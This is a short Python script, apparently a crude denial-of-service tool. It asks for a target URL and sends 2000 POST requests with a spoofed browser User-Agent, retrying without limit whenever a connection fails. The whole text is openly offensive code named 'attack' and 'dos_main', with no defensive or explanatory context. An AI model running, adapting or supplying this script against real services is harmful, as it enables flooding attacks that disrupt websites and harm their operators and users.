import requests
from urllib.parse import urlencode
from requests.exceptions import ConnectionError

def attack(url, param):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'localhost',
    }
    try:
        response = requests.post(url, data=param, headers=headers)
        print(response.status_code)
    except ConnectionError as e:
        print("Connection error:", e)
        print("Retrying the request...")
        attack(url, param)  # Retry the request

def dos_main():
    url = input("Enter the target URL: ")
    param = urlencode({'param1': '87845'})

    for _ in range(2000):
        attack(url, param)

if __name__ == "__main__":
   dos_main()
